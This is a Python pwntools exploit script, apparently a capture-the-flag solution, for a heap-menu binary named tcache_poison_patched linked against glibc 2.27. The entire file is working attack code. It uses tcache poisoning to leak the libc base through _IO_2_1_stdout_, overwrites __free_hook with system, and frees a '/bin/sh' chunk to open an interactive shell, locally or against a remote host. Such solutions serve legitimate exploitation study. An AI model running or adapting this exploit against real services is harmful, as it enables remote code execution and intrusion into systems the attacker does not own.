#!/usr/bin/env python3

from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './tcache_poison_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True
context.arch = elf.arch

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
p = start()
libc = ELF('libc-2.27.so')

def alloc(size,content):
    p.sendlineafter(b"4. Edit\n",b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Content: ', content)

def free():
    p.sendlineafter(b"4. Edit\n",b'2')

def printf():
    p.sendlineafter(b"4. Edit\n",b'3')
    p.recvuntil(b'Content: ')
    return p.recv(6)

def edit(content):
    p.sendlineafter(b"4. Edit\n",b'4')
    p.sendafter(b'Edit chunk: ', content)

alloc(0x18, b'a')
free()
edit(p64(0x601010))
alloc(0x18, b'a')
alloc(0x18, b'\x60')
stdout = u64(printf().ljust(8, b'\x00'))  #_IO_2_1_stdout_
libc.address = stdout - libc.symbols['_IO_2_1_stdout_']
log.info('libc.address: ' + hex(libc.address))
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']
alloc(0x28, b'a')
free()
edit(p64(free_hook))
alloc(0x28, b'a')
alloc(0x28, p64(system))
alloc(0x38, b'/bin/sh\x00')
free()
p.interactive()